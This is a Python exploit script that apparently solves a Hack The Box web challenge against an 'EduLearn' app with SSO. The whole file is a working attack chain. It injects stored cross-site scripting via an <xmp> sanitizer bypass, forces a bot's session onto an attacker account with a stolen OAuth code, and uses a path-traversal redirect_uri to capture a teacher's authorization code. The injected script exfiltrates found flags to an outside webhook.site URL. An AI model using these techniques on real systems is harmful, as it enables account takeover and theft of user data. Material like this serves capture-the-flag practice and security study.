#!/usr/bin/env python3
import re
import time
import urllib.parse

import requests

IP = "154.57.164.82"
PORT = 32107
BASE = f"http://{IP}:{PORT}"
APP = f"edulearn.htb:{PORT}"
SSO = f"sso.edulearn.htb:{PORT}"
CLIENT_ID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
HOOK = "https://webhook.site/2b639f7e-5069-44a3-9232-3b22ce2b30fe"

s = requests.Session()


def req(method, path, host, **kwargs):
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return s.request(method, BASE + path, headers=headers, timeout=45, **kwargs)


email = f"solve{int(time.time())}@x.htb"
password = "password123"
req("POST", "/api/register", SSO, json={"email": email, "password": password, "name": "Solve User"}).raise_for_status()
req("POST", "/api/login", SSO, json={"email": email, "password": password}).raise_for_status()

# Establish our own EduLearn session.
r = req("GET", "/auth", APP, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
r = req("GET", u.path + "?" + u.query, SSO, allow_redirects=False)
if r.status_code == 200:
    q = urllib.parse.parse_qs(u.query)
    r = req("POST", "/oauth/authorize", SSO, data={
        "client_id": CLIENT_ID,
        "scope": "email name",
        "redirect_uri": q["redirect_uri"][0],
        "state": q.get("state", [""])[0],
        "approved": "true",
    }, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
req("GET", u.path + "?" + u.query, APP, allow_redirects=False)

home = req("GET", "/", APP).text
assignment = re.search(r"/assignment/(\d+)", home).group(1)

# sanitize-html removes the XMP element but emits its raw-text child as markup,
# reconstructing the script.  The teacher code arrives in location.search.
script = (
    "(async()=>{"
    "let c=new URLSearchParams(location.search).get('code');"
    "if(c)await fetch('/oauth/callback?code='+encodeURIComponent(c));"
    "let h=await fetch('/').then(r=>r.text());"
    "let as=[...new Set([...h.matchAll(/\\/assignment\\/(\\d+)/g)].map(m=>m[1]))];"
    "for(let a of as){let p=await fetch('/assignment/'+a).then(r=>r.text());"
    "for(let m of p.matchAll(/\\/submission\\/(\\d+)/g)){"
    "let q=await fetch('/submission/'+m[1]).then(r=>r.text());"
    "let f=q.match(/HTB\\{[^}]+\\}/);"
    f"if(f){{new Image().src='{HOOK}/flag?d='+encodeURIComponent(f[0]);return}}"
    "}}})()"
)
payload = f"<xmp><script>{script}</script></xmp>"
r = req("POST", "/submit", APP, data={"assignmentId": assignment, "content": payload}, allow_redirects=False)
page = req("GET", r.headers["location"], APP).text
submission = re.findall(r"/submission/(\d+)", page)[0]
detail = req("GET", f"/submission/{submission}", APP).text
print("submission", submission, "script_reconstructed", "<script>" in detail, flush=True)

# Swap the bot's EduLearn session to our account so it may open our submission.
hold = f"http://edulearn.htb:{PORT}/oauth/callback/hold"
params = urllib.parse.urlencode({
    "response_type": "code", "client_id": CLIENT_ID,
    "scope": "email name", "redirect_uri": hold,
})
r = req("GET", "/oauth/authorize?" + params, SSO, allow_redirects=False)
attacker_code = urllib.parse.parse_qs(urllib.parse.urlsplit(r.headers["location"]).query)["code"][0]
req("POST", "/submit-url", APP, data={
    "url": "http://edulearn.htb:1337/oauth/callback?code=" + urllib.parse.quote(attacker_code, safe=""),
}, allow_redirects=False)
print("bot swapped", flush=True)

# The bot remains logged into the SSO as teacher.  Prefix validation accepts the
# traversal path; Chrome normalizes it to our submission and carries the teacher
# code in the query string, where the reconstructed script redeems it.
redirect_uri = f"http://edulearn.htb:1337/oauth/callback/../../submission/{submission}"
teacher_url = "http://sso.edulearn.htb:1337/oauth/authorize?" + urllib.parse.urlencode({
    "response_type": "code", "client_id": CLIENT_ID,
    "scope": "email name", "redirect_uri": redirect_uri,
})
r = req("POST", "/submit-url", APP, data={"url": teacher_url}, allow_redirects=False)
print("teacher trigger", r.status_code, r.headers.get("location"), flush=True)
